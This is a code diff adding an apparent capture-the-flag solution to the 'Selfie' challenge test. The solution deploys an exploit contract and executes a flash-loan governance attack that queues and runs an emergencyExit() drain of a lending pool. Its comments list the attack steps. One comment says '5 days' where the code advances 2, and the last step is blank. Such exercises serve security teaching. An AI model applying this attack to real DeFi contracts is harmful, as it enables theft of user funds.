@@ -39,6 +39,17 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let exploit = await (await ethers.getContractFactory('SelfieExploit', player)).deploy(pool.address, governance.address);
+        await exploit.connect(player).attack();
+
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
+
+        await (await governance.executeAction(1)).wait();
+        // 1. take out flashloan
+        // 2. take snapshot of governance token
+        // 3. now _hasEnoughVotes which calls governanceToken.getBalanceAtLastSnapshot will have enough votes
+        // 4. queueAction, call emergencyExit() on SelfiePool
+        // 5. 
     });
 
     after(async function () {
